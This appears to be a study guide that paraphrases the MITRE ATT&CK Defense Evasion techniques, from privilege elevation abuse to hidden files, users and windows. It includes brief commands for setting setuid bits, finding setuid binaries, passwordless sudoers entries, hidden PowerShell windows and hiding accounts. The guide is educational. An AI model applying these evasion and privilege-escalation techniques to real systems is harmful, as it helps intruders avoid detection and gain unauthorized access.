# Defense Evasion
Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.

<br>
<hr>

# Table of Contents 
- [Abuse Elevation Control Mechanism](#abuse-elevation-control-mechanism)
  - [Setuid & Setgid](#setuid-and-setgid)
  - [Bypass User Account Control](#bypass-user-account-control)
  - [Sudo and Sudo Caching](#sudo-and-sudo-caching)
  - [Elevated Execution with Prompt](#elevated-execution-with-prompt)
- [Access Token Manipulation](#access-token-manipulation)
  - [Token Impersonation / Theft](#token-impersonationtheft)
  - [Create Process with Token](#create-process-with-token)
  - [Make & Impersonate Token](#make-and-impersonate-token)
  - [Parent PID Spoofing](#parent-pid-spoofing)
  - [SID-History Injection](#sid-history-injection)
- [BITS Jobs](#bits-jobs)
- [Build Image on Host](#build-image-on-host)
- [Debugger Evasion](#debugger-evasion)
- [Deobfuscate/Decode Files or Information](#deobfuscatedecode-files-or-information)
- [Deploy Container](#deploy-container)
- [Direct Volume Access](#direct-volume-access)
- [Domain Policy Modification](#domain-policy-modification)
  - [Group Policy Modification](#group-policy-modification)
  - [Domain Trust Modification](#domain-trust-modification)
- [Execution Guardrails](#execution-guardrails)
  - [Environmental Keying](#environmental-keying)
- [Exploitation for Defense Evasion](#exploitation-for-defense-evasion)
- [File and Directory Permissions Modification](#file-and-directory-permissions-modification)
  - [Windows File and Directory Permissions Modification](#file-and-directory-permissions-modification)
  - [Linux and Mac File and Directory Permissions Modification](#linux-and-mac-file-and-directory-permissions-modification)
- [Hide Artifacts](#hide-artifacts)
  - [Hidden Files & Directories](#hidden-files-and-directories)
  - [Hidden Users](#hidden-users)
  - [Hidden Window](#hidden-window)
  - [NTFS File Attributes](#ntfs-file-attributes)
  - [Hidden File System](#hidden-file-system)
  - [Run Virtual Instance](#run-virtual-instance)
  - [VBA Stomping](#vba-stomping)
  - [Email Hiding Rules](#email-hiding-rules)
  - [Resource Forking](#resource-forking)
  - [Process Argument Spoofing](#process-argument-spoofing)
- [Hijack Execution Flow](#hijack-execution-flow)
  - [DLL Search Order Hijacking](#dll-search-order-hijacking)
  - [DLL Side-Loading](#dll-side-loading)
  - [Dylib Hijacking](#dylib-hijacking)
  - [Executable Installer File Permissions Weakness](#executable-installer-file-permissions-weakness)
  - [Dynamic Linker Hijacking](#dynamic-linker-hijacking)
  - [Path Interception by PATH Environment Variable](#path-interception-by-path-environment-variable)
  - [Path Interception by Search Order Hijacking](#path-interception-by-search-order-hijacking)
  - [Path Interception by Unquoted Path](#path-interception-by-unquoted-path)
  - [Services File Permissions Weakness](#services-file-permissions-weakness)
  - [Services Registry Permissions Weakness](#services-registry-permissions-weakness
  - [COR_PROFILER](#cor_profiler)
  - [KernelCallbackTable](#kernelcallbacktable)
- [Impair Defenses](#impair-defenses)
  - [Disable or Modify Tools](#disable-or-modify-tools)
  - [Disable Windows Event Logging](#disable-windows-event-logging)
  - [Impair Command History Logging](#impair-command-history-logging)
  - [Disable or Modify System Firewall](#disable-or-modify-system-firewall)
  - [Indicator Blocking](#indicator-blocking)
  - [Disable or Modify Cloud Firewall](#disable-or-modify-cloud-firewall)
  - [Disable Cloud Logs](#disable-cloud-logs)
  - [Safe Mode Boot](#safe-mode-boot)
  - [Downgrade Attack](#downgrade-attack)
- [Indicator Removal on Host](#indicator-removal-on-host)
  - [Clear Windows Event Logs](#clear-windows-event-logs)
  - [Clear Linux or Mac System Logs](#clear-linux-or-mac-system-logs)
  - [Clear Command History](#clear-command-history)
  - [File Deletion](#file-deletion)
  - [Network Share Connection Removal](#network-share-connection-removal)
  - [Timestomp](#timestomp)
- [Indirect Command Execution](#indirect-command-execution)
- [Masquerading](#masquerading)
  - [Invalid Code Signature](#invalid-code-signature)
  - [Right-to-Left Override](#right-to-left-override)
  - [Rename System Utilities](#rename-system-utilities)
  - [Masquerade Task or Service](#masquerade-task-or-service)
  - [Match Legitimate Name or Location](#match-legitimate-name-or-location)
  - [Space After Filename](#space-after-filename)
  - [Double File Extension](#double-file-extension)
- [Modify Authenication Process](#modify-authentication-process)
  - [Domain Controller Authentication](#domain-controller-authentication)
  - [Password Filter DLL](#password-filter-dll)
  - [Pluggable Authentication Modules](#pluggable-authentication-modules)
  - [Network Device Authentication](#network-device-authentication)
  - [Reversible Encryption](#reversible-encryption)
- [Modify Cloud Compute Infrastructure](#modify-cloud-compute-infrastructure)
  - [Create Snapshot](#create-snapshot)
  - [Create Cloud Instance](create-cloud-instance)
  - [Delete Cloud Instance](#delete-cloud-instance)
  - [Revert Cloud Instance](#revert-cloud-instance)
- [Modify Registry](#modify-registry)
- [Modify System Image](#modify-system-image)
  - [Patch System Image](#patch-system-image)
  - [Downgrade System Image](#downgrade-system-image)
- [Network Boundary Bridging](#network-boundary-bridging)
  - [Network Address Translation Traversal](#network-address-translation-traversal)
- [Obfuscated Files or Information](#obfuscated-files-or-information)
  - [Binary Padding](#binary-padding)
  - [Software Packing](#software-packing)
  - [Steganography](#steganography)
  - [Compile After Delivery](#compile-after-delivery)
  - [Indicator Removal from Tools](#indicator-removal-from-tools)
  - [HTML Smuggling](#html-smuggling)
- [Plist File Modification](#plist-file-modification)
- [Pre-OS Boot](#pre-os-boot)
  - [System Firmware](#system-firmware)
  - [Component Firmware](#component-firmware)
  - [Bootkit](#bootkit)
  - [ROMMONkit](#rommonkit)
  - [TFTP Boot](#tftp-boot)
- [Process Injection](#process-injection)
  - [Dynamic-link Library Injection](#dynamic-link-library-injection)
  - [Portable Executable Injection](#portable-executable-injection)
  - [Thread Execution Hijacking](#thread-execution-hijacking)
  - [Asynchronous Procedure Call](#asynchronous-procedure-call)
  - [Thread Local Storage](#thread-local-storage)
  - [Ptrace System Calls](#ptrace-system-calls)
  - [Proc Memory](#proc-memory)
  - [Extra Window Memory Injection](#extra-window-memory-injection)
  - [Process Hollowing](#process-hollowing)
  - [Process Doppelgänging](#process-doppelganging)
  - [VDSO Hijacking](#vdso-hijacking)
  - [ListPlanting](#listplanting)
- [Reflective Code Loading](#reflective-code-loading)
- [Rogue Domain Controller](#rogue-domain-controller)
- [Rootkit](#rootkit)
- [Subvert Trust Controls](#subvert-trust-controls)
  - [Gatekeeper Bypass](#gatekeeper-bypass)
  - [Code Signing](#code-signing)
  - [SIP and Trust Provider Hijacking](#sip-and-trust-provider-hijacking)
  - [Install Root Certificate](#install-root-certificate)
  - [Mark-of-the-Web Bypass](#mark-of-the-web-bypass)
  - [Code Signing Policy Modification](#code-signing-policy-modification)
- [System Binary Proxy Execution](#system-binary-proxy-execution)
  - [Compiled HTML File](#compiled-html-file)
  - [Control Panel](#control-panel)
  - [CMSTP](#cmstp)
  - [InstallUtil](#installutil)
  - [Mshta](#mshta)
  - [Msiexec](#msiexec)
  - [Odbcconf](#odbcconf)
  - [Regsvcs / Regasm](#regsvcsregasm)
  - [Regsvr32](#regsvr32)
  - [Rundll32](#rundll32)
  - [Verclsid](#verclsid)
  - [Mavinject](#mavinject)
  - [MMC](#mmc)
- [System Script Proxy Execution](#system-script-proxy-execution)
  - [PubPrn](#PubPrn)
- [Template Injection](#template-injection)
- [Traffic Signaling](#traffic-signaling)
  - [Port Knocking](#Port-knocking)
- [Trusted Developer Utilities Proxy Execution](#trusted-developer-utilities-proxy-execution)
  - [MSBuild](#msbuild)
- [Unused/Unsupported Cloud Regions](#unusedunsupported-cloud-regions)
- [Use Alternate Authentication Material](#use-alternate-authentication-material)
  - [Application Access Token](#application-access-token)
  - [Pass the Hash](#pass-the-hash)
  - [Pass the Ticket](#pass-the-ticket)
  - [Web Session Cookie](#web-session-cookie)
- [Valid Accounts](#valid-accounts)
  - [Default Account](#default-account)
  - [Domain Account](#domain-account)
  - [Local Account](#local-account)
  - [Cloud Account](#cloud-account)
- [Virtualization / Sandbox Evasion](#virtualizationsandbox-evasion)
  - [System Checks](#system-checks)
  - [User Activity Based Checks](#user-activity-based-checks)
  - [Time-Based Evasion](#time-based-evasion)
- [Weaken Encryption](#weaken-encryption)
  - [Reduce Key Space](#reduce-key-space)
  - [Disable Crypto Hardware](#disable-crypto-hardware)
- [XSL Script Processing](#xsl-script-processing)

<br>
<hr>

# Abuse Elevation Control Mechanism
Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.

<br>


## Setuid and Setgid
An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context

### Linux / macOS
When the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively. Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges

Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications
  * `chmod` can set these bits with bitmasking
    * Enable the setuid: `chmod 4777 [file]` or `chmod u+s [file]` 
  * Enable the setgit bit: `chmod 2775` and `chmod g+s` 

**Note:** This abuse is often part of a "shell escape" or other actions to bypass an execution environment with restricted permissions

Adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled
* The setuid and setguid bits are indicated with an "s" instead of an "x" when viewing a file's attributes via `ls -l`
* `find` command can also be used to search for such files
  * `find / -perm +4000 2>/dev/null`: Find files w/ setuid set
  * `find / -perm +2000 2>/dev/null`: Find files w/ setgid set

<br>

## Bypass User Account Control
Windows UAC allows a program to elevate its privileges to perform a task under administrator-level permissions, possibly by prompting the user for confirmation

If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box
* The use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access


Additional bypass methods are regularly discovered and some used in the wild, such as:
* **eventvwr.exe** can auto-elevate and execute a specified binary or script

<br>

## Sudo and Sudo Caching
Adversaries perform sudo caching and/or use the sudoers file to elevate privileges to execute commands as other users or spawn processes with higher privileges

### UNIX
**sudo:** Allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system
* `timestamp_timeout`: The amount of time in minutes between instances of sudo before it will re-prompt for a password
  * sudo has the ability to cache credentials for a period of time
  * sudo creates a file at `/var/db/sudo` with a timestamp of when sudo was last run to determine this timeout
  * Additionally, there is a `tty_tickets` variable that treats each new tty (terminal session) in isolation


The sudoers file (`/etc/sudoers`) describes which users can run which commands and from which terminals and which commands users can run as other users or groups
* The sudoers file can also specify when to not prompt users for passwords with a line like `user1 ALL=(ALL) NOPASSWD: ALL`

Adversaries can abuse poor configurations of these mechanisms to escalate privileges without needing the user's password
* `/var/db/sudo's timestamp` can be monitored to see if it falls within the *timestamp_timeout* range
  * If it does, then malware can execute sudo commands without needing to supply the user's password
  * If *tty_tickets* is disabled, adversaries can do this from any tty for that user

<br>

## Elevated Execution with Prompt
Adversaries may leverage the *AuthorizationExecuteWithPrivileges* API to escalate privileges by prompting the user for credentials. The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified.

Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.

Adversaries may abuse *AuthorizationExecuteWithPrivileges* to obtain root privileges in order to install malicious software on victims and install persistence mechanisms
* This technique may be combined with Masquerading to trick the user into granting escalated privileges to malicious code
* This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API

<br>

# Access Token Manipulation
Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.

An adversary can use built-in Windows API functions to copy access tokens from existing processes (Token Stealing)
* These token can then be applied to an existing process (Token Impersonation) or used to spawn a new process (Create Process with Token)

Any standard user can use the `runas` command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens

<br>

## Token Impersonation / Theft
An adversary can create a new access token that duplicates an existing token using *DuplicateToken(Ex)*
* The token can then be used with *ImpersonateLoggedOnUser* to allow the calling thread to impersonate a logged on user's security context, or with *SetThreadToken* to assign the impersonated token to a thread

An adversary may do this when they have a specific, existing process they want to assign the new token to
* This may be useful for when the target user has a non-network logon session on the system

<br>

## Create Process with Token
Processes can be created with the token and resulting security context of another user using features such as *CreateProcessWithTokenW* and *runas*

Creating processes with a different token may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used (ex: gathered via other means such as *Token Impersonation* or *Make and Impersonate Token*).

<br>

## Make and Impersonate Token
If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the *LogonUser* function. The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread

<br>

## Parent PID Spoofing
New processes are typically spawned directly from their parent, or calling, process unless explicitly specified
* One way of explicitly assigning the PPID of a new process is via the `CreateProcess` API call, which supports a parameter that defines the PPID to use
  * This functionality is used by Windows features such as the UAC to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via svchost.exe or consent.exe) rather than the current user context
 

Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be explorer.exe rather than an Office document delivered as part of Spearphishing Attachment
* This spoofing could be executed via Visual Basic within a malicious Office document or any code that can perform Native API

Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process
* An adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as lsass.exe), causing the new process to be elevated via the inherited access token

<br>

## SID-History Injection
**Windows security identifier (SID):** A unique value that identifies a user or group account
* SIDs are used by Windows security in both security descriptors and access tokens
  * An account can hold additional SIDs in the SID-History Active Directory attribute, allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens)

With Domain Administrator rights, harvested or well-known SID values may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators
* This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as Remote Services, SMB/Windows Admin Shares, or Windows Remote Management

<br>
<hr>

# BITS Jobs
**Background Intelligent Transfer Service (BITS)::** A low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM)
* BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

The interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool

Adversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots)

BITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol

<br>
<hr>

# Build Image on Host
Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote build request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.

An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize Deploy Container using that custom image
* If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image
* If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment

<br>
<hr>

# Debugger Evasion
Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads

Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment
* Similar to Virtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant
* They may also search for debugger artifacts before dropping secondary or additional payloads

Specific checks will vary based on the target and/or adversary, but may involve Native API function calls such as `IsDebuggerPresent()` and `NtQueryInformationProcess()`, or manually checking the `BeingDebugged` flag of the Process Environment Block (PEB)
* Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would "swallow" or handle the potential error)

Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping Native API function calls such as `OutputDebugStringW()`

<br>
<hr>

# Deobfuscate/Decode Files or Information
Adversaries may use obfuscated files or information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.

One such example is use of `certutil` to decode a remote access tool portable executable file that has been hidden inside a certificate file
* Another example is using the Windows `copy /b` command to reassemble binary fragments into a malicious payload


Sometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary

<br>
<hr>

# Deploy Container
Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware
* In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment

Containers can be deployed by various means, such as via Docker's create and start APIs or via a web application such as the Kubernetes dashboard or Kubeflow
* Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime

<br>
<hr>

# Direct Volume Access
Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools

Utilities, such as NinjaCopy, exist to perform these actions in PowerShell

<br>
<hr>

# Domain Policy Modification
Domains provide a centralized means of managing how computer resources can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts.

With sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Adversaries can also change configuration settings within the AD environment to implement a Rogue Domain Controller.

Adversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.

<br>

## Group Policy Modification
Group policy allows for centralized management of user and computer settings in AD
* GPOs are containers for group policy settings made up of files stored within a predicable network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`
  * GPOs have access controls associated with them; Its possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.

Malicious GPO modifications can be used to implement many other malicious behaviors such as Scheduled Task/Job, Disable or Modify Tools, Ingress Tool Transfer, Create Account, Service Execution, and more. 

Publicly available scripts such as `New-GPOImmediateTask` can be leveraged to automate the creation of a malicious Scheduled Task/Job by modifying GPO settings, in this case modifying `<GPO_PATH>\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml`
* An adversary might modify specific user rights like `SeEnableDelegationPrivilege`, set in `<GPO_PATH>\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf`, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs

<br>

## Domain Trust Modification
Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and/or elevate privileges. Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources. These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.

Manipulating the domain trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, this may be used to forge SAML Tokens, without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate.

<br>
<hr>

# Execution Guardrails
Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign. Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses

Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical Virtualization/Sandbox Evasion
* While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match
<br>

## Environmental Keying
**Environmental Keying:** An implementation of *Execution Guardrails* that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment
* Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target

Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. 

Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses
* By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult
  * These difficulties can slow down the incident response process and help adversaries hide their TTPs

<br>
<hr>

# Exploitation for Defense Evasion
Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the OS software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.

Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for Security Software Discovery
* The security software will likely be targeted directly for exploitation

<br>
<hr>

# File and Directory Permissions Modification
File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions
* File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions

Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files
* Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions
* This may enable malicious activity such as modifying, replacing, or deleting specific files or directories
* Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow
  
<br>

## Windows File and Directory Permissions Modification
Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs). DACLs identifies the accounts that are allowed or denied access to a securable object
* When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order; If a matching entry is found, access to the object is granted. Otherwise, access is denied.

Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls, cacls, takeown, and attrib`, which can grant adversaries higher permissions on specific files and folders
* PowerShell provides cmdlets that can be used to retrieve or modify file and directory DACLs
  * Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow

<br>

## Linux and Mac File and Directory Permissions Modification
Most Linux and Linux-based platforms provide a standard set of permission groups and a standard set of permissions that are applied to each group
* Most platforms provide two primary commands used to manipulate file and directory ACLs: `chown` (change owner) and `chmod` (change mode)

Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it
* They could subsequently lock others out of the file
* Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Unix Shell Configuration Modification or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow

<br>
<hr>

# Hide Artifacts
Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology

<br>

## Hidden Files and Directories
 To prevent normal users from accidentally changing special files on a system, most OS
s have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (`dir /a` for Windows and `ls –a` for Linux and macOS)

### Linux and Mac
Users can mark specific files as hidden simply by putting a "`.`" as the first character in the file or folder name. Files and folders that start with a period are by default hidden from being viewed in the Finder application and standard command-line utilities like "ls". Users must specifically change settings to have these files viewable.

Files on macOS can also be marked with the `UF_HIDDEN` flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app

### Windows
Users can mark specific files as hidden by using the `attrib.exe` binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys

Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files

<br>

## Hidden Users
Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users.

### macOS
Attackers can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes
* To prevent a user from being shown on the login screen and in System Preferences
*   Set the userID to be under 500 and set the key value `Hide500Users` to TRUE in the `/Library/Preferences/com.apple.loginwindow` plist file
  
Every user has a userID associated with it. When the `Hide500Users` key value is set to TRUE, users with a userID under 500 do not appear on the login screen and in System Preferences
* Using CLI, adversaries can use the *dscl* utility to create hidden user accounts by setting the `IsHidden` attribute to 1
* Adversaries can also hide a user’s home folder by changing the `chflags` to hidden

### Windows
**Hide user accounts** 
* Set the `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList` Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen

### Linux
**Hide user accounts from the login screen (referred to as the greeter)**
* The method an adversary may use depends on which Display Manager the distribution is currently using
  * On an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the gsettings command (ex: `sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true`)
  * **Note:** Display Managers are not anchored to specific distributions and may be changed by a user or adversary

<br>

## Hidden Window
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks

### Windows
There are a variety of features in scripting languages in Windows, such as PowerShell, Jscript, and Visual Basic to make windows hidden
* `powershell.exe -WindowStyle Hidden`

### macOS
The configurations for how applications run are listed in property list (plist) files
* One of the tags in these files can be `apple.awt.UIElement`, which allows for Java applications to prevent the application's icon from appearing in the Dock
* A common use for this is when applications run in the system tray, but don't also want to show up in the Dock

<br>

## NTFS File Attributes
Every NTFS formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. Within MFT entries are file attributes, such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files).

Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus

<br>

## Hidden File System
File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS

Adversaries may use a hidden file system to conceal malicious activity from users and security tools. 

Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system
* Adversaries can hide the presence of malicious components and file I/O from security tools. Hidden file systems (virtual file systems), can be implemented in numerous ways
  * Store a file system in reserved disk space unused by disk structures or standard file system partitions
  * Drop your own portable partition image as a file on top of the standard file system
  * Fragment files across the existing file system structure in non-standard ways

<br>

## Run Virtual Instance
By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values

Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries)
* After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system

<br>

## VBA Stomping
MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a *PerformanceCache* that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the *_VBA_PROJECT* stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application

An adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code
* Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code
* If the VBA source code is removed, some tools might even think that there are no macros present
* If there is a version match between the *_VBA_PROJECT* stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis

<br>

## Email Hiding Rules
Many email clients allow users to create inbox rules for various email functions. Rules may be created or modified within email clients or through external features such as the `New-InboxRule` or `Set-InboxRule` PowerShell cmdlets on Windows systems

Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders
* Adversaries may do this to hide security alerts, C2 communication, or responses to Internal Spearphishing emails sent from the compromised account.

Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails
* These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender
* Malicious rules commonly filter out emails based on key words (such as malware, suspicious, phish, and hack) found in message bodies and subject lines

<br>

## Resource Forking
**Resource forks:** Provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code. Usage of a resource fork is identifiable when displaying a file’s extended attributes, using `ls -l@` or `xattr -l` commands
